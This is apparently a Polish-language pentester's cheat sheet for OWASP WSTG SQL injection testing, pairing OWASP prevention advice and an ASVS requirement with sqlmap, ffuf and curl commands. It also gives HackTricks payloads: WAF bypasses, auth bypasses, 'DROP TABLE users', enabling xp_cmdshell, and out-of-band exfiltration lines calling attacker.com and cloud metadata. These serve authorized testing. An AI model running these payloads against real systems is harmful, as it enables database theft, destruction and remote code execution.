# WSTG-INPV-05 — Testing for SQL Injection

## Cele

- Identify SQL injection points
- Assess the severity of the injection and the level of access that can be achieved

## KOMENDY

### sqlmap - automatyczne wykrywanie i eksploitacja

```bash
sqlmap -u "https://TARGET/page?id=1" --batch --level=3 --risk=2 -o
sqlmap -u "https://TARGET/page?id=1" --batch --dbs
sqlmap -u "https://TARGET/page?id=1" --batch --tables -D database_name
sqlmap -u "https://TARGET/page?id=1" --batch --dump -D database_name -T table_name

```

### sqlmap z POST

```bash
sqlmap -u "https://TARGET/login" --data="username=admin&password=test" --batch --level=3

```

### sqlmap z cookie

```bash
sqlmap -u "https://TARGET/page" --cookie="session=TOKEN;id=1" --level=3 --batch

```

### sqlmap z plikiem request z Burp

```bash
sqlmap -r request.txt --batch --level=5 --risk=3

```

### ghauri - alternatywa dla sqlmap

```bash
ghauri -u "https://TARGET/page?id=1" --batch --level=3

```

### Reczne testowanie

```bash
curl -s "https://TARGET/page?id=1'" | head -50
curl -s "https://TARGET/page?id=1 OR 1=1--" | head -50
curl -s "https://TARGET/page?id=1 AND 1=2--" | head -50
curl -s "https://TARGET/page?id=1 UNION SELECT NULL--" | head -50
curl -s "https://TARGET/page?id=1; WAITFOR DELAY '0:0:5'--"
curl -s "https://TARGET/page?id=1' AND SLEEP(5)--"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SQLi payloads

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_Fuzz.txt" -mc all -o output_ffuf_sqli_fuzz.json

```

### Auth Bypass payloads

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Auth_Bypass.txt" -mc 200,302 -o output_ffuf_sqli_auth.json

```

### Error-based detection

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_ErrorBased.txt" -mc all -o output_ffuf_sqli_error.json

```

### Time-based blind (MySQL)

```bash
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/FUZZDB_MySQL-WHERE_Time.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_TimeBased.txt

```

### Union Select

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_UnionSelect.txt" -mc all -o output_ffuf_sqli_union.json

```

### Polyglots

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/SQLi_Polyglots.txt" -mc all -o output_ffuf_sqli_poly.json

```

### fuzzdb SQL Injection detect

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/sql-injection/detect/xplatform.txt -mc all -o output_ffuf_fuzzdb_sqli.json

```

### SecLists login bypass

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w Desktop/WSTG/SecLists-master/Fuzzing/login_bypass.txt -mc 200,302 -o output_ffuf_login_bypass.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj wszystkie parametry wejsciowe (GET, POST, Cookie, Headers)
2. Wstaw apostrof (') i sprawdz czy pojawia sie blad SQL
3. Testuj boolean-based: AND 1=1 vs AND 1=2 (roznica w odpowiedzi)
4. Testuj time-based: SLEEP(5), WAITFOR DELAY, pg_sleep(5)
5. Testuj UNION SELECT do wyciagania danych
6. Sprawdz error messages pod katem ujawnienia bazy danych
7. Testuj blind SQLi przez roznice w odpowiedziach
8. Sprawdz second-order SQLi (payload zapisany i uruchomiony pozniej)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — SQL_Injection_Prevention_Cheat_Sheet.md, Query_Parameterization_Cheat_Sheet.md, Injection_Prevention_Cheat_Sheet.md

### Mechanizmy obrony (w kolejnosci skutecznosci)

**Defense 1 — Prepared Statements (Parameterized Queries):**
- To PRIMARY DEFENSE — zawsze uzywaj prepared statements zamiast konkatenacji stringow
- Java: `PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); stmt.setInt(1, userId);`
- .NET: `SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id"); cmd.Parameters.AddWithValue("@id", userId);`
- PHP PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id"); $stmt->execute(['id' => $userId]);`
- Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
- Node.js: `connection.query("SELECT * FROM users WHERE id = ?", [userId])`

**Defense 2 — Stored Procedures:**
- Moga byc bezpieczne JESLI nie uzywaja dynamicznego SQL wewnatrz
- Niebezpieczny przyklad: `EXEC('SELECT * FROM users WHERE id = ' + @userId)` — to NADAL jest SQLi
- Bezpieczny przyklad: `SELECT * FROM users WHERE id = @userId` (parameterized wewnatrz procedury)

**Defense 3 — Allowlist Input Validation:**
- Dodatkowa warstwa, NIE jako jedyna obrona
- Uzywaj dla nazw tabel/kolumn, klauzul ORDER BY — tam gdzie parametryzacja nie dziala
- Waliduj typ danych: jesli oczekujesz liczby, konwertuj na int przed uzyciem

**Defense 4 — Escaping User Input:**
- OSTATECZNOSC — tylko gdy inne metody niemozliwe (np. legacy code)
- Kazda baza danych ma inne znaki specjalne do eskejpowania
- MySQL: `mysql_real_escape_string()`, Oracle: zamien `'` na `''`

### Dodatkowe zabezpieczenia
- Zasada least privilege: konto DB aplikacji z minimalnymi uprawnieniami (nie sa, nie dbo)
- Nie uzywaj konta DB z uprawnieniami DBA/root do polaczenia aplikacji
- Usun lub wylacz niepotrzebne funkcje DB (xp_cmdshell w MSSQL, UTL_FILE w Oracle)
- Uzywaj roznych kont DB dla roznych modulow aplikacji
- Uzywaj widokow (views) zamiast bezposredniego dostepu do tabel

### Typowe bledy developerow
- Konkatenacja stringow: `"SELECT * FROM users WHERE name = '" + userName + "'"` — ZAWSZE podatne
- ORM nie chroni przed wszystkim: raw queries w Hibernate HQL, Django raw(), Sequelize literal() sa podatne
- Uzywanie blacklist zamiast allowlist (np. blokowanie `SELECT` ale nie `SeLeCt`)
- Walidacja tylko po stronie klienta (JavaScript) — latwa do obejscia

### Wektory ataku do testowania
- Classic: `' OR '1'='1`, `' UNION SELECT null,null--`, `'; DROP TABLE users--`
- Blind SQLi: `' AND 1=1--` vs `' AND 1=2--` (roznica w odpowiedzi)
- Time-based: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)--` (MySQL)
- Error-based: `' AND 1=CONVERT(int,(SELECT @@version))--`
- Out-of-band: `'; EXEC xp_dirtree '\\\\attacker.com\\share'--`
- Second-order: payload zapisany w DB i uruchomiony pozniej w innym zapytaniu

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SQLiPy | Integracja SQLMap z Burp przez SQLMap API — automatyczna eksploatacja SQLi | [GitHub](https://github.com/codewatchorg/sqlipy) |
| burp-xss-sql-plugin | Wykrywanie XSS i SQL Injection w parametrach | [GitHub](https://github.com/attackercan/burp-xss-sql-plugin) |
| Burptime | Pomiar czasu odpowiedzi dla time-based blind SQLi | [GitHub](https://github.com/virusdefender/burptime) |
| SQLi Query Tampering | Generator payloadow SQLi z obfuskacja i tamperingiem | [GitHub](https://github.com/xer0days/SQLi-Query-Tampering) |
| SQLMap DNS Collaborator | Eksfiltracja danych SQL przez DNS z Burp Collaborator | [GitHub](https://github.com/lucacapacci/SqlmapDnsCollaborator) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.4 | Injection Prevention | Verify that data selection or database queries (e.g., SQL, HQL, NoSQL, Cypher) use parameterized queries, ORMs, entity frameworks, or are otherwise protected from SQL Injection and other database injection attacks. This is also relevant when writing stored procedures. |


---

## HackTricks Tips

### MySQL

- **WAF bypass — `information_schema` alternatywy**: `mysql.innodb_table_stats`, `sys.x$schema_flattened_keys`, `sys.schema_table_statistics`
- **WAF bypass — scientific notation**: `-1' or 1.e(1) or '1'='1`
- **WAF bypass — spacje jako `/**/`**: `'/**/OR/**/SLEEP(5)--/**/-'`
- **UNION bez przecinków**: `-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#`
- **Bypass kolumn (no column names)**: `select (select 1,'flaf') = (SELECT * from demo limit 1);`
- **Error-based via `updatexml()`**: `updatexml(null,concat(0x7e,(SELECT secret FROM tbl LIMIT 1),0x7e,'///'),null)`
- **GBK multi-byte auth bypass**: `%bf' or 1=1 -- --`
- **Raw MD5 bypass**: string `ffifdyop` → hash zawiera `' or '6...`
- **INSERT ON DUPLICATE KEY UPDATE**: nadpisanie hasła admina przez duplikat email
- **SSRF via `LOAD_FILE()`**: `SELECT LOAD_FILE(CONCAT('\\\\',secret,'.attacker.com\\a'))`

### PostgreSQL

- **Dump DB w jednym wierszu**: `SELECT query_to_xml('select * from pg_user',true,true,'')` lub `database_to_xml(true,true,'')`
- **Hex bypass filtrów**: `select query_to_xml(convert_from('\x{hex}','UTF8'),true,true,'')`
- **No-quote via dollar-quoting**: `SELECT $$hacktricks$$` lub `$TAG$value$TAG$`
- **RCE via extensions (.so)**: upload przez `pg_largeobject` + `lo_export`, load z path traversal `'../data/poc'`
- **OOB exfil via `dblink_connect`**: exfil przez connection string username

### MSSQL

- **AD user enumeration**: `SELECT SUSER_SNAME(0x{domain_SID}{user_id})` — brute 1000-2000
- **Full schema JSON**: `' union select null,(select * from information_schema.columns for json auto),null--`
- **WAF bypass**: `%C2%85` (NEL) / `%C2%A0` (NBSP) jako spacja; `0eunion select`; `from.table` (kropka zamiast spacji)
- **Enable xp_cmdshell jednym payloadem**: `exec('sp_configure''xp_cmdshell'',''1''reconfigure')`
- **SSRF via `fn_xe_file_target_read_file`**: exfil przez burp.net w parametrze ścieżki

### Oracle

- **DNS OOB**: `SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.oob',80) FROM dual`
- **Full HTTP via `UTL_HTTP`**: `select UTL_HTTP.request('http://169.254.169.254/...') from dual`
- **OOB XXE w UNION**: `EXTRACTVALUE(xmltype('<!DOCTYPE...'),'/l') FROM dual--`

### NoSQL (MongoDB)

- **Auth bypass**: `{"username":{"$ne":null},"password":{"$ne":null}}`
- **Blind regex**: `{"username":"admin","password":{"$regex":"^m"}}`
- **`$where` error-based**: `{"$where":"if(this._id>'...')throw new Error(JSON.stringify(this))"}`
- **`$lookup` cross-collection pivot** w `aggregate()`
- **PHP MongoLite `$func`**: `{"user":{"$func":"var_dump"}}` → arbitrary PHP callback

### ORM Injection

- **Django `filter(**data)` brute**: `{"password__startswith":"a"}` — iteruj prefix
- **Django relational traversal**: `{"created_by__user__password__contains":"pbkdf2"}`
- **Prisma type-confusion**: `{"resetToken":{"not":"E"}}` — operator zamiast stringa
- **Ransack (Ruby) token brute**: `GET /posts?q[user_reset_password_token_start]=0`

### SQLMap tips

- **Second-order**: `sqlmap -r login.txt -p username --second-url "http://target/profile"`
- **Flask signed cookie**: `--eval "from flask_unsign import session as s; session=s.sign({...})"`
- **WAF tampers**: `versionedmorekeywords`, `space2comment`, `unmagicquotes`, `luanginxmore` (4.2M dummy params)
